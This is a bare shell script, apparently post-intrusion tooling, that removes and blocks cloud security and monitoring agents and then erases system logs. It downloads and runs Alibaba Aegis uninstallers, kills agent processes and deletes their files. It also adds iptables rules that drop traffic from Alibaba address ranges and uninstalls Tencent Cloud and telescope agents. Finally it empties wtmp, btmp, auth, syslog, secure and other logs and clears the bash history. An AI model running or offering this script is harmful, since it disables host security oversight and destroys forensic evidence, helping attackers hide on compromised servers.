wget http://update.aegis.aliyun.com/download/uninstall.sh
sh uninstall.sh
wget http://update.aegis.aliyun.com/download/quartz_uninstall.sh
sh quartz_uninstall.sh
pkill aliyun-service
ps -A | grep agent
killall -9 aliyun-service
killall -9 AliYunDun
rm -fr /etc/init.d/agentwatch /usr/sbin/aliyun-service
rm -rf /usr/local/aegis*
iptables -I INPUT -s 140.205.201.0/28 -j DROP
iptables -I INPUT -s 140.205.201.16/29 -j DROP
iptables -I INPUT -s 140.205.201.32/28 -j DROP
iptables -I INPUT -s 140.205.225.192/29 -j DROP
iptables -I INPUT -s 140.205.225.200/30 -j DROP
iptables -I INPUT -s 140.205.225.184/29 -j DROP
iptables -I INPUT -s 140.205.225.183/32 -j DROP
iptables -I INPUT -s 140.205.225.206/32 -j DROP
iptables -I INPUT -s 140.205.225.205/32 -j DROP
iptables -I INPUT -s 140.205.225.195/32 -j DROP
iptables -I INPUT -s 140.205.225.204/32 -j DROP
sh /usr/local/qcloud/stargate/admin/uninstall.sh
sh /usr/local/qcloud/YunJing/uninst.sh
sh /usr/local/qcloud/monitor/barad/admin/uninstall.sh
rm -rf /usr/local/qcloud
service telescoped stop
/usr/local/telescope/telescoped stop
sh /usr/local/telescope/uninstall.sh
echo > /var/log/wtmp
echo > /var/log/btmp 
echo>/var/log/lastlog 
echo > /var/log/secure 
echo > /var/log/messages
echo>/var/log/syslog 
echo>/var/log/xferlog
echo>/var/log/auth.log
echo>/var/log/user.log
cat /dev/null > /var/adm/sylog
cat /dev/null > /var/log/maillog
cat /dev/null > /var/log/openwebmail.log
cat /dev/null > /var/log/mail.info
echo>/var/run/utmp
echo > .bash_history
history -c&& history -w